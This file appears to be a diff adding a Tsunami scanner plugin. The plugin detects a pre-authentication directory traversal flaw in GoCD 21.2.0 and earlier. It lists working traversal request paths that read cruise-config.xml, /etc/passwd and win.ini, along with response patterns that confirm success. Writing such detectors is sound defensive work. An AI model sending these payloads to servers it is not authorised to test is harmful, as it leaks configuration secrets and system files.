@@ -1,0 +1,70 @@
+# proto-file: proto/templated_plugin.proto
+# proto-message: TemplatedPlugin
+
+###############
+# PLUGIN INFO #
+###############
+
+info: {
+  type: VULN_DETECTION
+  name: "GoCDArbitraryFileReadingDetector"
+  author: "threedr3am (qiaoer1320@gmail.com)"
+  version: "1.0"
+}
+
+finding: {
+  main_id: {
+    publisher: "TSUNAMI_COMMUNITY"
+    value: "GoCD_ARBITRARY_FILE_READING"
+  }
+  severity: CRITICAL
+  title: "GoCD Pre-Auth Arbitrary File Reading vulnerability"
+  description: "In GoCD 21.2.0 and earlier, there is an endpoint that can be accessed without authentication. This endpoint has a directory traversal vulnerability, and any user can read any file on the server without authentication, causing information leakage.https://www.gocd.org/releases/#21-3-0"
+  recommendation: "Update 21.3.0 released, or later released."
+}
+
+config: {}
+
+###########
+# ACTIONS #
+###########
+
+actions: {
+  name: "verify_business_continuity_file_read"
+  http_request: {
+    method: GET
+    uri: [
+      "/go/add-on/business-continuity/api/plugin?folderName=&pluginName=../../config/cruise-config.xml",
+      "/add-on/business-continuity/api/plugin?folderName=&pluginName=../../config/cruise-config.xml",
+      "/go/add-on/business-continuity/api/plugin?folderName=&pluginName=../../../../../../../../../../../../../../../../etc/go/cruise-config.xml",
+      "/go/add-on/business-continuity/api/plugin?folderName=&pluginName=../../../../../../../../../../../../../../../../etc/passwd",
+      "/add-on/business-continuity/api/plugin?folderName=&pluginName=../../../../../../../../../../../../../../../../etc/passwd",
+      "/go/add-on/business-continuity/api/plugin?folderName=&pluginName=../../../../../../../../../../../../../../../../Windows/win.ini",
+      "/add-on/business-continuity/api/plugin?folderName=&pluginName=../../../../../../../../../../../../../../../../Windows/win.ini"
+    ]
+    client_options: {
+      disable_follow_redirects: true
+    }
+    response: {
+      http_status: 200
+      expect_any: {
+        conditions: [
+          { body: {} contains: "xsi:noNamespaceSchemaLocation=\"cruise-config.xsd\"" },
+          { body: {} contains: "root:x:0:0:" },
+          { body: {} contains: "root:*:0:0:" },
+          { body: {} contains: "; for 16-bit app support" }
+        ]
+      }
+    }
+  }
+}
+
+#############
+# WORKFLOWS #
+#############
+
+workflows: {
+  actions: [
+    "verify_business_continuity_file_read"
+  ]
+}
